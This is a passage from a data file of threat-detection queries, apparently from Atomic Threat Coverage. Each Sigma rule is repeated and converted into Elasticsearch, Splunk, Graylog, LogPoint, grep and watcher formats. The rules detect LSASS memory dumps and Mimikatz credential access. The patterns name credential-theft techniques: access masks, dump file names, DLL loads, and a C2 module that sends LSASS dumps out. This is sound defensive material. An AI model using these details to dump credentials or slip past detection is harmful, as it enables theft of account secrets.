GrantedAccess=\"0x1fffff\" (CallTrace=\"*dbghelp.dll*\" OR CallTrace=\"*dbgcore.dll*\"))", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"10\" TargetImage=\"C:\\\\\\\\windows\\\\\\\\system32\\\\\\\\lsass.exe\" GrantedAccess=\"0x1fffff\" CallTrace IN [\"*dbghelp.dll*\", \"*dbgcore.dll*\"])", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*10)(?=.*C:\\\\windows\\\\system32\\\\lsass\\\\.exe)(?=.*0x1fffff)(?=.*(?:.*.*dbghelp\\\\.dll.*|.*.*dbgcore\\\\.dll.*)))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: LSASS memory dump file creation\nid: 5e3d3601-0662-4af0-b1d2-36a05e90c40a\ndescription: LSASS memory dump creation using operating systems utilities. Procdump will use process name in output file if no name is specified\nauthor: Teymur Kheirkhabarov, oscd.community\nreferences:\n    - https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment\ndate: 2019/10/22\nmodified: 2019/11/13\ntags:\n    - attack.credential_access\n    - attack.t1003\nlogsource:\n    product: windows\n    service: sysmon\ndetection:\n    selection:\n        EventID: 11\n        TargetFilename|contains: 'lsass'\n        TargetFilename|endswith: 'dmp'\n    condition: selection\nfalsepositives:\n    - Dumping lsass memory for forensic investigation purposes by legitimate incident responder or forensic invetigator\nlevel: medium\nstatus: experimental", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: LSASS memory dump file creation\nid: 5e3d3601-0662-4af0-b1d2-36a05e90c40a\ndescription: LSASS memory dump creation using operating systems utilities. Procdump will use process name in output file if no name is specified\nauthor: Teymur Kheirkhabarov, oscd.community\nreferences:\n    - https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment\ndate: 2019/10/22\nmodified: 2019/11/13\ntags:\n    - attack.credential_access\n    - attack.t1003\nlogsource:\n    product: windows\n    service: sysmon\ndetection:\n    selection:\n        EventID: 11\n        TargetFilename|contains: 'lsass'\n        TargetFilename|endswith: 'dmp'\n    condition: selection\nfalsepositives:\n    - Dumping lsass memory for forensic investigation purposes by legitimate incident responder or forensic invetigator\nlevel: medium\nstatus: experimental", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(EventID:\"11\" AND TargetFilename.keyword:*lsass* AND TargetFilename.keyword:*dmp)", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/LSASS-memory-dump-file-creation <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"LSASS memory dump file creation\",\\n    \"description\": \"LSASS memory dump creation using operating systems utilities. Procdump will use process name in output file if no name is specified\",\\n    \"tags\": [\\n      \"attack.credential_access\",\\n      \"attack.t1003\"\\n    ],\\n    \"query\": \"(EventID:\\\\\"11\\\\\" AND TargetFilename.keyword:*lsass* AND TargetFilename.keyword:*dmp)\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(EventID:\\\\\"11\\\\\" AND TargetFilename.keyword:*lsass* AND TargetFilename.keyword:*dmp)\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'LSASS memory dump file creation\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(EventID:\"11\" AND TargetFilename.keyword:*lsass* AND TargetFilename.keyword:*dmp)", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(EventID=\"11\" TargetFilename=\"*lsass*\" TargetFilename=\"*dmp\")", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"11\" TargetFilename=\"*lsass*\" TargetFilename=\"*dmp\")", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*11)(?=.*.*lsass.*)(?=.*.*dmp))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Mimikatz Detection LSASS Access\nid: 0d894093-71bc-43c3-8c4d-ecfc28dcf5d9\nstatus: experimental\ndescription: Detects process access to LSASS which is typical for Mimikatz (0x1000 PROCESS_QUERY_ LIMITED_INFORMATION, 0x0400 PROCESS_QUERY_ INFORMATION \"only old\n    versions\", 0x0010 PROCESS_VM_READ)\nreferences:\n    - https://onedrive.live.com/view.aspx?resid=D026B4699190F1E6!2843&ithint=file%2cpptx&app=PowerPoint&authkey=!AMvCRTKB_V1J5ow\n    - https://cyberwardog.blogspot.com/2017/03/chronicles-of-threat-hunter-hunting-for_22.html\ntags:\n    - attack.t1003\n    - attack.s0002\n    - attack.credential_access\n    - car.2019-04-004\nlogsource:\n    product: windows\n    service: sysmon\ndetection:\n    selection:\n        EventID: 10\n        TargetImage: 'C:\\windows\\system32\\lsass.exe'\n        GrantedAccess:\n            - '0x1410'      \n            - '0x1010'      \n    condition: selection\nfalsepositives:\n    - unknown\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Mimikatz Detection LSASS Access\nid: 0d894093-71bc-43c3-8c4d-ecfc28dcf5d9\nstatus: experimental\ndescription: Detects process access to LSASS which is typical for Mimikatz (0x1000 PROCESS_QUERY_ LIMITED_INFORMATION, 0x0400 PROCESS_QUERY_ INFORMATION \"only old\n    versions\", 0x0010 PROCESS_VM_READ)\nreferences:\n    - https://onedrive.live.com/view.aspx?resid=D026B4699190F1E6!2843&ithint=file%2cpptx&app=PowerPoint&authkey=!AMvCRTKB_V1J5ow\n    - https://cyberwardog.blogspot.com/2017/03/chronicles-of-threat-hunter-hunting-for_22.html\ntags:\n    - attack.t1003\n    - attack.s0002\n    - attack.credential_access\n    - car.2019-04-004\nlogsource:\n    product: windows\n    service: sysmon\ndetection:\n    selection:\n        EventID: 10\n        TargetImage: 'C:\\windows\\system32\\lsass.exe'\n        GrantedAccess:\n            - '0x1410'      \n            - '0x1010'      \n    condition: selection\nfalsepositives:\n    - unknown\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(EventID:\"10\" AND TargetImage:\"C\\\\:\\\\\\\\windows\\\\\\\\system32\\\\\\\\lsass.exe\" AND GrantedAccess:(\"0x1410\" OR \"0x1010\"))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Mimikatz-Detection-LSASS-Access <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Mimikatz Detection LSASS Access\",\\n    \"description\": \"Detects process access to LSASS which is typical for Mimikatz (0x1000 PROCESS_QUERY_ LIMITED_INFORMATION, 0x0400 PROCESS_QUERY_ INFORMATION \\\\\"only old versions\\\\\", 0x0010 PROCESS_VM_READ)\",\\n    \"tags\": [\\n      \"attack.t1003\",\\n      \"attack.s0002\",\\n      \"attack.credential_access\",\\n      \"car.2019-04-004\"\\n    ],\\n    \"query\": \"(EventID:\\\\\"10\\\\\" AND TargetImage:\\\\\"C\\\\\\\\:\\\\\\\\\\\\\\\\windows\\\\\\\\\\\\\\\\system32\\\\\\\\\\\\\\\\lsass.exe\\\\\" AND GrantedAccess:(\\\\\"0x1410\\\\\" OR \\\\\"0x1010\\\\\"))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(EventID:\\\\\"10\\\\\" AND TargetImage:\\\\\"C\\\\\\\\:\\\\\\\\\\\\\\\\windows\\\\\\\\\\\\\\\\system32\\\\\\\\\\\\\\\\lsass.exe\\\\\" AND GrantedAccess:(\\\\\"0x1410\\\\\" OR \\\\\"0x1010\\\\\"))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Mimikatz Detection LSASS Access\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(EventID:\"10\" AND TargetImage:\"C\\\\:\\\\\\\\windows\\\\\\\\system32\\\\\\\\lsass.exe\" AND GrantedAccess:(\"0x1410\" \"0x1010\"))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(EventID=\"10\" TargetImage=\"C:\\\\\\\\windows\\\\\\\\system32\\\\\\\\lsass.exe\" (GrantedAccess=\"0x1410\" OR GrantedAccess=\"0x1010\"))", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"10\" TargetImage=\"C:\\\\\\\\windows\\\\\\\\system32\\\\\\\\lsass.exe\" GrantedAccess IN [\"0x1410\", \"0x1010\"])", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*10)(?=.*C:\\\\windows\\\\system32\\\\lsass\\\\.exe)(?=.*(?:.*0x1410|.*0x1010)))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Mimikatz In-Memory\nid: c0478ead-5336-46c2-bd5e-b4c84bc3a36e\nstatus: experimental\ndescription: Detects certain DLL loads when Mimikatz gets executed\nreferences:\n    - https://securityriskadvisors.com/blog/post/detecting-in-memory-mimikatz/\ntags:\n    - attack.s0002\n    - attack.t1003\n    - attack.lateral_movement\n    - attack.credential_access\n    - car.2019-04-004\nlogsource:\n    product: windows\n    service: sysmon\ndetection:\n    selector:\n        EventID: 7\n        Image: 'C:\\Windows\\System32\\rundll32.exe'\n    dllload1:\n        ImageLoaded: '*\\vaultcli.dll'\n    dllload2:\n        ImageLoaded: '*\\wlanapi.dll'        \n    exclusion:\n        ImageLoaded:\n            - 'ntdsapi.dll'\n            - 'netapi32.dll'\n            - 'imm32.dll'\n            - 'samlib.dll'\n            - 'combase.dll'\n            - 'srvcli.dll'\n            - 'shcore.dll'\n            - 'ntasn1.dll'\n            - 'cryptdll.dll'\n            - 'logoncli.dll'\n    timeframe: 30s\n    condition: selector | near dllload1 and dllload2 and not exclusion\nfalsepositives:\n    - unknown\nlevel: medium", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Mimikatz In-Memory\nid: c0478ead-5336-46c2-bd5e-b4c84bc3a36e\nstatus: experimental\ndescription: Detects certain DLL loads when Mimikatz gets executed\nreferences:\n    - https://securityriskadvisors.com/blog/post/detecting-in-memory-mimikatz/\ntags:\n    - attack.s0002\n    - attack.t1003\n    - attack.lateral_movement\n    - attack.credential_access\n    - car.2019-04-004\nlogsource:\n    product: windows\n    service: sysmon\ndetection:\n    selector:\n        EventID: 7\n        Image: 'C:\\Windows\\System32\\rundll32.exe'\n    dllload1:\n        ImageLoaded: '*\\vaultcli.dll'\n    dllload2:\n        ImageLoaded: '*\\wlanapi.dll'        \n    exclusion:\n        ImageLoaded:\n            - 'ntdsapi.dll'\n            - 'netapi32.dll'\n            - 'imm32.dll'\n            - 'samlib.dll'\n            - 'combase.dll'\n            - 'srvcli.dll'\n            - 'shcore.dll'\n            - 'ntasn1.dll'\n            - 'cryptdll.dll'\n            - 'logoncli.dll'\n    timeframe: 30s\n    condition: selector | near dllload1 and dllload2 and not exclusion\nfalsepositives:\n    - unknown\nlevel: medium", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Mimikatz-In-Memory <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Mimikatz In-Memory\",\\n    \"description\": \"Detects certain DLL loads when Mimikatz gets executed\",\\n    \"tags\": [\\n      \"attack.s0002\",\\n      \"attack.t1003\",\\n      \"attack.lateral_movement\",\\n      \"attack.credential_access\",\\n      \"car.2019-04-004\"\\n    ],\\n    \"query\": \"(EventID:\\\\\"7\\\\\" AND Image:\\\\\"C\\\\\\\\:\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\System32\\\\\\\\\\\\\\\\rundll32.exe\\\\\")\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30s\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(EventID:\\\\\"7\\\\\" AND Image:\\\\\"C\\\\\\\\:\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\System32\\\\\\\\\\\\\\\\rundll32.exe\\\\\")\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Mimikatz In-Memory\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "grep -P '^(?:.*(?=.*7)(?=.*C:\\\\Windows\\\\System32\\\\rundll32\\\\.exe))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Dumping Lsass.exe memory with MiniDumpWriteDump API\nid: dd5ab153-beaa-4315-9647-65abc5f71541\nstatus: experimental\ndescription: Detects the use of MiniDumpWriteDump API for dumping lsass.exe memory in a stealth way. Tools like ProcessHacker and some attacker tradecract use this\n    API found in dbghelp.dll or dbgcore.dll. As an example, SilentTrynity C2 Framework has a module that leverages this API to dump the contents of Lsass.exe and\n    transfer it over the network back to the attacker's machine.\ndate: 27/10/2019\nmodified: 2019/11/13\nauthor: Perez Diego (@darkquassar), oscd.community\nreferences:\n    - https://docs.microsoft.com/en-us/windows/win32/api/minidumpapiset/nf-minidumpapiset-minidumpwritedump\n    - https://www.pinvoke.net/default.aspx/dbghelp/MiniDumpWriteDump.html\n    - https://medium.com/@fsx30/bypass-edrs-memory-protection-introduction-to-hooking-2efb21acffd6\ntags:\n    - attack.credential_access\n    - attack.t1003\nlogsource:\n    product: windows\n    service: sysmon\ndetection:\n    signedprocess:\n        EventID: 7\n        ImageLoaded|endswith:\n            - '\\dbghelp.dll'\n            - '\\dbgcore.dll'\n        Image|endswith: \n            - '\\msbuild.exe'\n            - '\\cmd.exe'\n            - '\\svchost.exe'\n            - '\\rundll32.exe'\n            - '\\powershell.exe'\n            - '\\word.exe'\n            - '\\excel.exe'\n            - '\\powerpnt.exe'\n            - '\\outlook.exe'\n            - '\\monitoringhost.exe'\n            - '\\wmic.exe'\n            - '\\msiexec.exe'\n            - '\\bash.exe'\n            - '\\wscript.exe'\n            - '\\cscript.exe'\n            - '\\mshta.exe'\n            - '\\regsvr32.exe'\n            - '\\schtasks.exe'\n            - '\\dnx.exe'\n            - '\\regsvcs.exe'\n            - '\\sc.exe'\n            - '\\scriptrunner.exe'\n    unsignedprocess:\n        EventID: 7\n        ImageLoaded|endswith:\n            - '\\dbghelp.dll'\n            - '\\dbgcore.dll'\n        Signed: \"FALSE\"\n    filter:\n        Image|contains: 'Visual Studio'\n    condition: (signedprocess AND NOT filter) OR (unsignedprocess AND NOT filter)\nfalsepositives:\n    - Penetration tests\nlevel: critical", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Dumping Lsass.exe memory with MiniDumpWriteDump API\nid: dd5ab153-beaa-4315-9647-65abc5f71541\nstatus: experimental\ndescription: Detects the use of MiniDumpWriteDump API for dumping lsass.exe memory in a stealth way. Tools like ProcessHacker and some attacker tradecract use this\n    API found in dbghelp.dll or dbgcore.dll. As an example, SilentTrynity C2 Framework has a module that leverages this API to dump the contents of Lsass.exe and\n    transfer it over the network back to the attacker's machine.\ndate: 27/10/2019\nmodified: 2019/11/13\nauthor: Perez Diego (@darkquassar), oscd.community\nreferences:\n    - https://docs.microsoft.com/en-us/windows/win32/api/minidumpapiset/nf-minidumpapiset-minidumpwritedump\n    - https://www.pinvoke.net/default.aspx/dbghelp/MiniDumpWriteDump.html\n    - https://medium.com/@fsx30/bypass-edrs-memory-protection-introduction-to-hooking-2efb21acffd6\ntags:\n    - attack.credential_access\n    - attack.t1003\nlogsource:\n    product: windows\n    service: sysmon\ndetection:\n    signedprocess:\n        EventID: 7\n        ImageLoaded|endswith:\n            - '\\dbghelp.dll'\n            - '\\dbgcore.dll'\n        Image|endswith: \n            - '\\msbuild.exe'\n            - '\\cmd.exe'\n            - '\\svchost.exe'\n            - '\\rundll32.exe'\n            - '\\powershell.exe'\n            - '\\word.exe'\n            - '\\excel.exe'\n            - '\\powerpnt.exe'\n            - '\\outlook.exe'\n            - '\\monitoringhost.exe'\n            - '\\wmic.exe'\n            - '\\msiexec.exe'\n            - '\\bash.exe'\n            - '\\wscript.exe'\n            - '\\cscript.exe'\n            - '\\mshta.exe'\n            - '\\regsvr32.exe'\n            - '\\schtasks.exe'\n            - '\\dnx.exe'\n            - '\\regsvcs.exe'\n            - '\\sc.exe'\n            - '\\scriptrunner.exe'\n    unsignedprocess:\n        EventID: 7\n        ImageLoaded|endswith:\n            - '\\dbghelp.dll'\n            - '\\dbgcore.dll'\n        Signed: \"FALSE\"\n    filter:\n        Image|contains: 'Visual Studio'\n    condition: (signedprocess AND NOT filter) OR (unsignedprocess AND NOT filter)\nfalsepositives:\n    - Penetration tests\nlevel: critical", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(((EventID:\"7\" AND ImageLoaded.keyword:(*\\\\\\\\dbghelp.dll OR *\\\\\\\\dbgcore.dll) AND Image.keyword:(*\\\\\\\\msbuild.exe OR *\\\\\\\\cmd.exe OR *\\\\\\\\svchost.exe OR *\\\\\\\\rundll32.exe OR *\\\\\\\\powershell.exe OR *\\\\\\\\word.exe OR *\\\\\\\\excel.exe OR *\\\\\\\\powerpnt.exe OR *\\\\\\\\outlook.exe OR *\\\\\\\\monitoringhost.exe OR *\\\\\\\\wmic.exe OR *\\\\\\\\msiexec.exe OR *\\\\\\\\bash.exe OR *\\\\\\\\wscript.exe OR *\\\\\\\\cscript.exe OR *\\\\\\\\mshta.exe OR *\\\\\\\\regsvr32.exe OR *\\\\\\\\schtasks.exe OR *\\\\\\\\dnx.exe OR *\\\\\\\\regsvcs.exe OR *\\\\\\\\sc.exe OR *\\\\\\\\scriptrunner.exe)) AND (NOT (Image.keyword:*Visual\\\\ Studio*))) OR ((EventID:\"7\" AND ImageLoaded.keyword:(*\\\\\\\\dbghelp.dll OR *\\\\\\\\dbgcore.dll) AND Signed:\"FALSE\") AND (NOT (Image.keyword:*Visual\\\\ Studio*))))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Dumping-Lsass.exe-memory-with-MiniDumpWriteDump-API <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Dumping Lsass.exe memory with MiniDumpWriteDump API\",\\n    \"description\": \"Detects the use of MiniDumpWriteDump API for dumping lsass.exe memory in a stealth way. Tools like ProcessHacker and some attacker tradecract use this API found in dbghelp.dll or dbgcore.dll. As an example, SilentTrynity C2 Framework has a module that leverages this API to dump the contents of Lsass.exe and transfer it over the network back to the attacker\\'s machine.\",\\n    \"tags\": [\\n      \"attack.credential_access\",\\n      \"attack.t1003\"\\n    ],\\n    \"query\": \"(((EventID:\\\\\"7\\\\\" AND ImageLoaded.keyword:(*\\\\\\\\\\\\\\\\dbghelp.dll OR *\\\\\\\\\\\\\\\\dbgcore.dll) AND Image.keyword:(*\\\\\\\\\\\\\\\\msbuild.exe OR *\\\\\\\\\\\\\\\\cmd.exe OR *\\\\\\\\\\\\\\\\svchost.exe OR *\\\\\\\\\\\\\\\\rundll32.exe OR *\\\\\\\\\\\\\\\\powershell.exe OR *\\\\\\\\\\\\\\\\word.exe OR *\\\\\\\\\\\\\\\\excel.exe OR *\\\\\\\\\\\\\\\\powerpnt.exe OR *\\\\\\\\\\\\\\\\outlook.exe OR *\\\\\\\\\\\\\\\\monitoringhost.exe OR *\\\\\\\\\\\\\\\\wmic.exe OR *\\\\\\\\\\\\\\\\msiexec.exe OR *\\\\\\\\\\\\\\\\bash.exe OR *\\\\\\\\\\\\\\\\wscript.exe OR *\\\\\\\\\\\\\\\\cscript.exe OR *\\\\\\\\\\\\\\\\mshta.exe OR *\\\\\\\\\\\\\\\\regsvr32.exe OR *\\\\\\\\\\\\\\\\schtasks.exe OR *\\\\\\\\\\\\\\\\dnx.exe OR *\\\\\\\\\\\\\\\\regsvcs.exe OR *\\\\\\\\\\\\\\\\sc.exe OR *\\\\\\\\\\\\\\\\scriptrunner.exe)) AND (NOT (Image.keyword:*Visual\\\\\\\\ Studio*))) OR ((EventID:\\\\\"7\\\\\" AND ImageLoaded.keyword:(*\\\\\\\\\\\\\\\\dbghelp.dll OR *\\\\\\\\\\\\\\\\dbgcore.dll) AND Signed:\\\\\"FALSE\\\\\") AND (NOT (Image.keyword:*Visual\\\\\\\\ Studio*))))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(((EventID:\\\\\"7\\\\\" AND ImageLoaded.keyword:(*\\\\\\\\\\\\\\\\dbghelp.dll OR *\\\\\\\\\\\\\\\\dbgcore.dll) AND Image.keyword:(*\\\\\\\\\\\\\\\\msbuild.exe OR *\\\\\\\\\\\\\\\\cmd.exe OR *\\\\\\\\\\\\\\\\svchost.exe OR *\\\\\\\\\\\\\\\\rundll32.exe OR *\\\\\\\\\\\\\\\\powershell.exe OR *\\\\\\\\\\\\\\\\word.exe OR *\\\\\\\\\\\\\\\\excel.exe OR *\\\\\\\\\\\\\\\\powerpnt.exe OR *\\\\\\\\\\\\\\\\outlook.exe OR *\\\\\\\\\\\\\\\\monitoringhost.exe OR *\\\\\\\\\\\\\\\\wmic.exe OR *\\\\\\\\\\\\\\\\msiexec.exe OR *\\\\\\\\\\\\\\\\bash.exe OR *\\\\\\\\\\\\\\\\wscript.exe OR *\\\\\\\\\\\\\\\\cscript.exe OR *\\\\\\\\\\\\\\\\mshta.exe OR *\\\\\\\\\\\\\\\\regsvr32.exe OR *\\\\\\\\\\\\\\\\schtasks.exe OR *\\\\\\\\\\\\\\\\dnx.exe OR *\\\\\\\\\\\\\\\\regsvcs.exe OR *\\\\\\\\\\\\\\\\sc.exe OR *\\\\\\\\\\\\\\\\scriptrunner.exe)) AND (NOT (Image.keyword:*Visual\\\\\\\\ Studio*))) OR ((EventID:\\\\\"7\\\\\" AND ImageLoaded.keyword:(*\\\\\\\\\\\\\\\\dbghelp.dll OR *\\\\\\\\\\\\\\\\dbgcore.dll) AND Signed:\\\\\"FALSE\\\\\") AND (NOT (Image.keyword:*Visual\\\\\\\\ Studio*))))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Dumping Lsass.exe memory with MiniDumpWriteDump API\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(((EventID:\"7\" AND ImageLoaded.keyword:(*\\\\\\\\dbghelp.dll *\\\\\\\\dbgcore.dll) AND Image.keyword:(*\\\\\\\\msbuild.exe *\\\\\\\\cmd.exe *\\\\\\\\svchost.exe *\\\\\\\\rundll32.exe *\\\\\\\\powershell.exe *\\\\\\\\word.exe *\\\\\\\\excel.exe *\\\\\\\\powerpnt.exe *\\\\\\\\outlook.exe *\\\\\\\\monitoringhost.exe *\\\\\\\\wmic.exe *\\\\\\\\msiexec.exe *\\\\\\\\bash.exe *\\\\\\\\wscript.exe *\\\\\\\\cscript.exe *\\\\\\\\mshta.exe *\\\\\\\\regsvr32.exe *\\\\\\\\schtasks.exe *\\\\\\\\dnx.exe *\\\\\\\\regsvcs.exe *\\\\\\\\sc.exe *\\\\\\\\scriptrunner.exe)) AND (NOT (Image.keyword:*Visual Studio*))) OR ((EventID:\"7\" AND ImageLoaded.keyword:(*\\\\\\\\dbghelp.dll *\\\\\\\\dbgcore.dll) AND Signed:\"FALSE\") AND (NOT (Image.keyword:*Visual Studio*))))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(((EventID=\"7\" (ImageLoaded=\"*\\\\\\\\dbghelp.dll\" OR ImageLoaded=\"*\\\\\\\\dbgcore.dll\") (Image=\"*\\\\\\\\msbuild.exe\" OR Image=\"*\\\\\\\\cmd.exe\" OR Image=\"*\\\\\\\\svchost.exe\" OR Image=\"*\\\\\\\\rundll32.exe\" OR Image=\"*\\\\\\\\powershell.exe\" OR Image=\"*\\\\\\\\word.exe\" OR Image=\"*\\\\\\\\excel.exe\" OR Image=\"*\\\\\\\\powerpnt.exe\" OR Image=\"*\\\\\\\\outlook.exe\" OR Image=\"*\\\\\\\\monitoringhost.exe\" OR Image=\"*\\\\\\\\wmic.exe\" OR Image=\"*\\\\\\\\msiexec.exe\" OR Image=\"*\\\\\\\\bash.exe\" OR Image=\"*\\\\\\\\wscript.exe\" OR Image=\"*\\\\\\\\cscript.exe\" OR Image=\"*\\\\\\\\mshta.exe\" OR Image=\"*\\\\\\\\regsvr32.exe\" OR Image=\"*\\\\\\\\schtasks.exe\" OR Image=\"*\\\\\\\\dnx.exe\" OR Image=\"*\\\\\\\\regsvcs.exe\" OR Image=\"*\\\\\\\\sc.exe\" OR Image=\"*\\\\\\\\scriptrunner.exe\")) NOT (Image=\"*Visual Studio*\")) OR ((EventID=\"7\" (ImageLoaded=\"*\\\\\\\\dbghelp.dll\" OR ImageLoaded=\"*\\\\\\\\dbgcore.dll\") Signed=\"FALSE\") NOT (Image=\"*Visual Studio*\")))", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(((event_id=\"7\" ImageLoaded IN [\"*\\\\\\\\dbghelp.dll\", \"*\\\\\\\\dbgcore.dll\"] Image IN [\"*\\\\\\\\msbuild.exe\", \"*\\\\\\\\cmd.exe\", \"*\\\\\\\\svchost.exe\", \"*\\\\\\\\rundll32.exe\", \"*\\\\\\\\powershell.exe\", \"*\\\\\\\\word.exe\", \"*\\\\\\\\excel.exe\", \"*\\\\\\\\powerpnt.exe\", \"*\\\\\\\\outlook.exe\", 